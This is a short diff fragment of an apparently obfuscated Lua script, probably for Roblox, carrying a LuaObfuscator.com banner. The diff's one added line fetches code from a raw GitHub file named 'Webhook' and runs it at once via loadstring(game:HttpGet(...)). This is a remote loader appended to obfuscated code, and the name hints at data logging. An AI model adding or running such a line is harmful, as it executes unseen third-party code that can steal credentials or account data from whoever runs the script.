@@ -10,3 +10,4 @@ local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or 
           \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
 
 ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Duy02022007/vn/main/Webhook"))()
